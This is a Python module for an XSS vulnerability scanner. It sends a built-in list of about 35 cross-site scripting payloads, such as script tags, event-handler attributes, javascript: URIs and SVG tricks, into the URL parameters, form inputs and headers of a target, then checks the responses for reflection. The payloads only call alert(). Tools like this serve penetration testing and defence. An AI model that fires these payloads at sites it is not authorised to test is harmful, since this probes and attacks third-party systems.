#!/usr/bin/env python3
"""
XSS (Cross-Site Scripting) Scanner Module
Author: SayerLinux
"""

import os
import re
import requests
import time
from typing import List, Dict, Any
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse


class XSSScanner:
    """Cross-Site Scripting vulnerability scanner"""
    
    def __init__(self, config):
        self.config = config
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': config.get('user_agent')})
        
        # Load XSS payloads
        self.payloads = self._load_payloads()
        
        # Setup timeout and retries
        self.timeout = config.get('timeout', 30)
        self.retries = config.get('retries', 3)
    
    def _load_payloads(self) -> List[str]:
        """Load XSS payloads from file or use defaults"""
        payload_file = self.config.get('payloads.xss_payloads_file')
        
        if payload_file and os.path.exists(payload_file):
            with open(payload_file, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        
        # Default XSS payloads
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio><source onerror=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<link rel=import href=data:text/html,<script>alert('XSS')</script>>",
            "<meta http-equiv=refresh content=0;url=javascript:alert('XSS')>",
            "<base href=javascript:alert('XSS')//>",
            "<object data=javascript:alert('XSS')>",
            "<embed src=javascript:alert('XSS')>",
            "<form action=javascript:alert('XSS')><input type=submit>",
            "<button onclick=alert('XSS')>Click me</button>",
            "<details ontoggle=alert('XSS') open>test</details>",
            "<summary onfocus=alert('XSS') autofocus>test</summary>",
            "<dialog onclose=alert('XSS') open>test</dialog>",
            "<menuitem onfocus=alert('XSS') autofocus>test</menuitem>",
            "<bgsound src=javascript:alert('XSS')>",
            "<img src='data:image/svg+xml,<svg xmlns=\"http://www.w3.org/2000/svg\" onload=alert(1)></svg>'>",
            "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=alert('XSS')></svg>",
            "<math href=javascript:alert('XSS')>test</math>",
            "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
            "<svg><set attributeName=onload value=alert('XSS') />",
            "<svg><animateTransform onbegin=alert('XSS') attributeName=transform type=rotate dur=1s />",
            "<svg><foreignObject onload=alert('XSS')>test</foreignObject>",
            "<svg><image href=javascript:alert('XSS') />",
            "<svg><script>alert('XSS')</script></svg>",
            "<svg><style onload=alert('XSS')>test</style></svg>"
        ]
    
    def scan(self, target: str) -> List[Dict[str, Any]]:
        """Scan target for XSS vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Get initial response to find forms and parameters
            response = self.session.get(target, timeout=self.timeout)
            
            # Scan URL parameters
            url_vulns = self._scan_url_parameters(target)
            vulnerabilities.extend(url_vulns)
            
            # Scan forms
            form_vulns = self._scan_forms(target, response.text)
            vulnerabilities.extend(form_vulns)
            
            # Scan headers
            header_vulns = self._scan_headers(target)
            vulnerabilities.extend(header_vulns)
            
            # DOM-based XSS detection
            dom_vulns = self._scan_dom_xss(target)
            vulnerabilities.extend(dom_vulns)
            
        except Exception as e:
            print(f"Error in XSS scan: {str(e)}")
        
        return vulnerabilities
    
    def _scan_url_parameters(self, url: str) -> List[Dict[str, Any]]:
        """Scan URL parameters for XSS"""
        vulnerabilities = []
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param_name in params.keys():
            for payload in self.payloads:
                try:
                    # Create test URL with payload
                    new_params = params.copy()
                    new_params[param_name] = [payload]
                    
                    new_query = urlencode(new_params, doseq=True)
                    test_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, new_query, parsed.fragment
                    ))
                    
                    response = self.session.get(test_url, timeout=self.timeout)
                    
                    if self._detect_xss(response, payload):
                        vulnerabilities.append({
                            'type': 'XSS',
                            'subtype': 'Reflected XSS',
                            'severity': 'high',
                            'description': f'Reflected XSS in URL parameter: {param_name}',
                            'parameter': param_name,
                            'payload': payload,
                            'url': test_url,
                            'evidence': response.text[:200] + '...' if len(response.text) > 200 else response.text
                        })
                    
                    time.sleep(self.config.get('delay', 0))
                    
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    def _scan_forms(self, url: str, html_content: str) -> List[Dict[str, Any]]:
        """Scan forms for XSS vulnerabilities"""
        vulnerabilities = []
        
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(html_content, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                form_action = form.get('action', '')
                form_method = form.get('method', 'get').lower()
                inputs = form.find_all(['input', 'textarea', 'select'])
                
                form_url = urljoin(url, form_action)
                
                for input_tag in inputs:
                    input_name = input_tag.get('name')
                    if not input_name:
                        continue
                    
                    input_type = input_tag.get('type', 'text')
                    if input_type.lower() in ['submit', 'button', 'hidden']:
                        continue
                    
                    for payload in self.payloads:
                        try:
                            form_data = {}
                            for inp in inputs:
                                name = inp.get('name')
                                if name:
                                    if name == input_name:
                                        form_data[name] = payload
                                    else:
                                        form_data[name] = inp.get('value', 'test')
                            
                            if form_method == 'post':
                                response = self.session.post(form_url, data=form_data, timeout=self.timeout)
                            else:
                                response = self.session.get(form_url, params=form_data, timeout=self.timeout)
                            
                            if self._detect_xss(response, payload):
                                vulnerabilities.append({
                                    'type': 'XSS',
                                    'subtype': 'Stored XSS' if form_method == 'post' else 'Reflected XSS',
                                    'severity': 'high',
                                    'description': f'XSS in form input: {input_name}',
                                    'form_action': form_action,
                                    'form_method': form_method,
                                    'input_name': input_name,
                                    'payload': payload,
                                    'url': form_url,
                                    'evidence': response.text[:200] + '...' if len(response.text) > 200 else response.text
                                })
                            
                            time.sleep(self.config.get('delay', 0))
                            
                        except Exception as e:
                            continue
        
        except Exception as e:
            print(f"Error scanning forms: {str(e)}")
        
        return vulnerabilities
    
    def _scan_headers(self, url: str) -> List[Dict[str, Any]]:
        """Scan headers for XSS vulnerabilities"""
        vulnerabilities = []
        
        headers_to_test = ['User-Agent', 'Referer', 'X-Forwarded-For', 'X-Real-IP']
        
        for header in headers_to_test:
            for payload in self.payloads:
                try:
                    headers = {header: payload}
                    response = self.session.get(url, headers=headers, timeout=self.timeout)
                    
                    if self._detect_xss(response, payload):
                        vulnerabilities.append({
                            'type': 'XSS',
                            'subtype': 'Header-based XSS',
                            'severity': 'medium',
                            'description': f'XSS via HTTP header: {header}',
                            'header': header,
                            'payload': payload,
                            'url': url,
                            'evidence': response.text[:200] + '...' if len(response.text) > 200 else response.text
                        })
                    
                    time.sleep(self.config.get('delay', 0))
                    
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    def _scan_dom_xss(self, url: str) -> List[Dict[str, Any]]:
        """Scan for DOM-based XSS vulnerabilities"""
        vulnerabilities = []
        
        # DOM-based XSS sinks
        dom_sinks = [
            'document.write',
            'document.writeln',
            'element.innerHTML',
            'element.outerHTML',
            'element.insertAdjacentHTML',
            'eval',
            'setTimeout',
            'setInterval',
            'new Function',
            'location',
            'location.href',
            'location.replace',
            'location.assign',
            'window.open'
        ]
        
        try:
            response = self.session.get(url, timeout=self.timeout)
            
            for sink in dom_sinks:
                if sink.lower() in response.text.lower():
                    # Check for potential DOM XSS patterns
                    patterns = [
                        rf'{re.escape(sink)}\s*\(\s*[^)]*location\.[a-zA-Z]+[^)]*\)',
                        rf'{re.escape(sink)}\s*\(\s*[^)]*document\.URL[^)]*\)',
                        rf'{re.escape(sink)}\s*\(\s*[^)]*window\.location[^)]*\)',
                        rf'{re.escape(sink)}\s*\(\s*[^)]*document\.referrer[^)]*\)',
                        rf'{re.escape(sink)}\s*\(\s*[^)]*document\.cookie[^)]*\)'
                    ]
                    
                    for pattern in patterns:
                        matches = re.findall(pattern, response.text, re.IGNORECASE)
                        if matches:
                            vulnerabilities.append({
                                'type': 'XSS',
                                'subtype': 'DOM-based XSS',
                                'severity': 'high',
                                'description': f'Potential DOM XSS via {sink}',
                                'sink': sink,
                                'pattern': pattern,
                                'matches': matches[:3],  # Limit to 3 matches
                                'url': url
                            })
        
        except Exception as e:
            print(f"Error scanning DOM XSS: {str(e)}")
        
        return vulnerabilities
    
    def _detect_xss(self, response: requests.Response, payload: str) -> bool:
        """Detect if XSS payload was executed"""
        try:
            content_type = response.headers.get('content-type', '').lower()
            if 'text/html' not in content_type:
                return False
            
            # Check if payload appears in response
            decoded_payload = payload
            if decoded_payload in response.text:
                # Additional checks for context
                if self._is_in_script_context(response.text, decoded_payload):
                    return True
                elif self._is_in_html_context(response.text, decoded_payload):
                    return True
                elif self._is_in_attribute_context(response.text, decoded_payload):
                    return True
            
            return False
            
        except Exception as e:
            return False
    
    def _is_in_script_context(self, html: str, payload: str) -> bool:
        """Check if payload is in JavaScript context"""
        script_pattern = r'<script[^>]*>.*?' + re.escape(payload) + r'.*?</script>'
        return bool(re.search(script_pattern, html, re.IGNORECASE | re.DOTALL))
    
    def _is_in_html_context(self, html: str, payload: str) -> bool:
        """Check if payload is in HTML context"""
        # Check for payload in HTML tags
        tag_pattern = r'<[^>]*' + re.escape(payload) + r'[^>]*>'
        return bool(re.search(tag_pattern, html, re.IGNORECASE))
    
    def _is_in_attribute_context(self, html: str, payload: str) -> bool:
        """Check if payload is in HTML attribute context"""
        attr_pattern = r'\w+\s*=\s*["\'][^"\']*' + re.escape(payload) + r'[^"\']*["\']'
        return bool(re.search(attr_pattern, html, re.IGNORECASE))